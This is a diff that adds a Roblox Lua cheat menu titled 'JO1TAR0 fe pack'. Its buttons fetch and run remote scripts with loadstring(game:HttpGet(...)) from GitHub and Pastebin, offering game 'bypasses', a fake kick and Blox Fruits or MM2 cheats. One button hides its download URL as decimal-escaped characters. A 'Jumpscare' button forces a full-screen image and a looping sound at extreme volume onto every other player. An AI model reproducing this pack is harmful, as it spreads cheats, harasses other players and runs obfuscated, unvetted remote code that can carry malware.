@@ -1,0 +1,280 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextLabel = Instance.new("TextLabel")
+local JUMPSCARE = Instance.new("TextButton")
+local MM2 = Instance.new("TextButton")
+local FRUIT = Instance.new("TextButton")
+local JOHN = Instance.new("TextButton")
+local JOBYPASS = Instance.new("TextButton")
+local BYPASS = Instance.new("TextButton")
+local kick = Instance.new("TextButton")
+local GUN = Instance.new("TextButton")
+local ssp = Instance.new("TextButton")
+
+--Properties:
+
+ScrollingFrame.Parent = game.StarterGui.ScreenGui
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Position = UDim2.new(0.338242948, 0, 0.271867573, 0)
+ScrollingFrame.Size = UDim2.new(0, 329, 0, 274)
+ScrollingFrame.CanvasPosition = Vector2.new(0, 450)
+
+TextLabel.Parent = ScrollingFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 2
+TextLabel.Position = UDim2.new(0.231003046, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "JO1TAR0 fe pack"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+JUMPSCARE.Name = "JUMPSCARE"
+JUMPSCARE.Parent = TextLabel
+JUMPSCARE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+JUMPSCARE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+JUMPSCARE.BorderSizePixel = 2
+JUMPSCARE.Position = UDim2.new(-0.340000004, 0, 1.12, 0)
+JUMPSCARE.Size = UDim2.new(0, 300, 0, 50)
+JUMPSCARE.Font = Enum.Font.SourceSans
+JUMPSCARE.Text = "Jumpscare[no one can see it]"
+JUMPSCARE.TextColor3 = Color3.fromRGB(0, 0, 0)
+JUMPSCARE.TextScaled = true
+JUMPSCARE.TextSize = 14.000
+JUMPSCARE.TextWrapped = true
+
+MM2.Name = "MM2"
+MM2.Parent = TextLabel
+MM2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MM2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+MM2.BorderSizePixel = 2
+MM2.Position = UDim2.new(-0.340000004, 0, 2.4000001, 0)
+MM2.Size = UDim2.new(0, 300, 0, 50)
+MM2.Font = Enum.Font.SourceSans
+MM2.Text = "MM2 Script"
+MM2.TextColor3 = Color3.fromRGB(0, 0, 0)
+MM2.TextScaled = true
+MM2.TextSize = 14.000
+MM2.TextWrapped = true
+
+FRUIT.Name = "FRUIT"
+FRUIT.Parent = TextLabel
+FRUIT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FRUIT.BorderColor3 = Color3.fromRGB(0, 0, 0)
+FRUIT.BorderSizePixel = 2
+FRUIT.Position = UDim2.new(-0.340000004, 0, 3.74000001, 0)
+FRUIT.Size = UDim2.new(0, 300, 0, 50)
+FRUIT.Font = Enum.Font.SourceSans
+FRUIT.Text = "Blox Fruit Script"
+FRUIT.TextColor3 = Color3.fromRGB(0, 0, 0)
+FRUIT.TextScaled = true
+FRUIT.TextSize = 14.000
+FRUIT.TextWrapped = true
+
+JOHN.Name = "JOHN"
+JOHN.Parent = TextLabel
+JOHN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+JOHN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+JOHN.BorderSizePixel = 2
+JOHN.Position = UDim2.new(-0.340000004, 0, 5.11999989, 0)
+JOHN.Size = UDim2.new(0, 300, 0, 50)
+JOHN.Font = Enum.Font.SourceSans
+JOHN.Text = "John Doe"
+JOHN.TextColor3 = Color3.fromRGB(0, 0, 0)
+JOHN.TextScaled = true
+JOHN.TextSize = 14.000
+JOHN.TextWrapped = true
+
+JOBYPASS.Name = "JOBYPASS"
+JOBYPASS.Parent = TextLabel
+JOBYPASS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+JOBYPASS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+JOBYPASS.BorderSizePixel = 2
+JOBYPASS.Position = UDim2.new(-0.340000004, 0, 6.51999998, 0)
+JOBYPASS.Size = UDim2.new(0, 300, 0, 50)
+JOBYPASS.Font = Enum.Font.SourceSans
+JOBYPASS.Text = "JO1TAR0 prison life fe bopass"
+JOBYPASS.TextColor3 = Color3.fromRGB(0, 0, 0)
+JOBYPASS.TextScaled = true
+JOBYPASS.TextSize = 14.000
+JOBYPASS.TextWrapped = true
+
+BYPASS.Name = "BYPASS"
+BYPASS.Parent = TextLabel
+BYPASS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+BYPASS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BYPASS.BorderSizePixel = 2
+BYPASS.Position = UDim2.new(-0.340000004, 0, 7.78000021, 0)
+BYPASS.Size = UDim2.new(0, 300, 0, 50)
+BYPASS.Font = Enum.Font.SourceSans
+BYPASS.Text = "Prison Life Fe Bypass[not by jo1tar0]"
+BYPASS.TextColor3 = Color3.fromRGB(0, 0, 0)
+BYPASS.TextScaled = true
+BYPASS.TextSize = 14.000
+BYPASS.TextWrapped = true
+
+kick.Name = "kick"
+kick.Parent = TextLabel
+kick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+kick.BorderColor3 = Color3.fromRGB(0, 0, 0)
+kick.BorderSizePixel = 2
+kick.Position = UDim2.new(-0.340000004, 0, 9.26000023, 0)
+kick.Size = UDim2.new(0, 300, 0, 50)
+kick.Font = Enum.Font.SourceSans
+kick.Text = "fe fake kick script"
+kick.TextColor3 = Color3.fromRGB(0, 0, 0)
+kick.TextScaled = true
+kick.TextSize = 14.000
+kick.TextWrapped = true
+
+GUN.Name = "GUN"
+GUN.Parent = TextLabel
+GUN.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GUN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+GUN.BorderSizePixel = 2
+GUN.Position = UDim2.new(-0.340000004, 0, 10.7799997, 0)
+GUN.Size = UDim2.new(0, 300, 0, 50)
+GUN.Font = Enum.Font.SourceSans
+GUN.Text = "fe gun"
+GUN.TextColor3 = Color3.fromRGB(0, 0, 0)
+GUN.TextScaled = true
+GUN.TextSize = 14.000
+GUN.TextWrapped = true
+
+ssp.Name = "ssp"
+ssp.Parent = TextLabel
+ssp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ssp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ssp.BorderSizePixel = 2
+ssp.Position = UDim2.new(-0.340000004, 0, 12.1999998, 0)
+ssp.Size = UDim2.new(0, 300, 0, 50)
+ssp.Font = Enum.Font.SourceSans
+ssp.Text = "SSP"
+ssp.TextColor3 = Color3.fromRGB(0, 0, 0)
+ssp.TextScaled = true
+ssp.TextSize = 14.000
+ssp.TextWrapped = true
+
+-- Scripts:
+
+local function BVYB_fake_script() -- JUMPSCARE.Script 
+	local script = Instance.new('Script', JUMPSCARE)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+				spawn(function()
+					local newgui = Instance.new("ScreenGui",v.PlayerGui)
+					newgui.Name = "Screamer"
+					local newimage = Instance.new("ImageLabel",newgui)
+					newimage.Image = "http://www.roblox.com/asset/?id=14031197258"
+					newimage.Size = UDim2.new(1,1,1,1)
+					local s = Instance.new("Sound",newgui)
+					s.SoundId = "rbxassetid://9069609200"
+					s.Volume = 9999999999999999999999999999999999999
+					s.Looped = true
+					s:Play()
+					print("Screamed "..v.Name)
+					while wait(9) do
+	
+						newimage.Parent:Destroy()
+	
+					end
+				end)
+			end
+		end
+	end)
+end
+coroutine.wrap(BVYB_fake_script)()
+local function KMVWMK_fake_script() -- ScrollingFrame.Smooth GUI Dragging 
+	local script = Instance.new('LocalScript', ScrollingFrame)
+
+	local UserInputService = game:GetService("UserInputService")
+	local runService = (game:GetService("RunService"));
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	function Lerp(a, b, m)
+		return a + (b - a) * m
+	end;
+	
+	local lastMousePos
+	local lastGoalPos
+	local DRAG_SPEED = (8); -- // The speed of the UI darg.
+	function Update(dt)
+		if not (startPos) then return end;
+		if not (dragging) and (lastGoalPos) then
+			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
+			return 
+		end;
+	
+		local delta = (lastMousePos - UserInputService:GetMouseLocation())
+		local xGoal = (startPos.X.Offset - delta.X);
+		local yGoal = (startPos.Y.Offset - delta.Y);
+		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
+		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
+	end;
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+			lastMousePos = UserInputService:GetMouseLocation()
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	runService.Heartbeat:Connect(Update)
+end
+coroutine.wrap(KMVWMK_fake_script)()
+ssp.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/jo1tar0/ssp_updated/main/SSP"))();
+end)
+kick.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://github.com/jo1tar0/a/blob/main/a"))();
+end)
+BYPASS.MouseButton1Down:connect(function() 
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
+end)
+JOBYPASS.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/KSv9D7A9"))();
+end)
+JOHN.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/johndoe", true))()
+end)
+MM2.MouseButton1Down:connect(function() 
+	loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+end)
+FRUIT.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
+end)
+FRUIT.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet('https://raw.ithubusercontent.com/VEZ2/NEV'))()
+end)
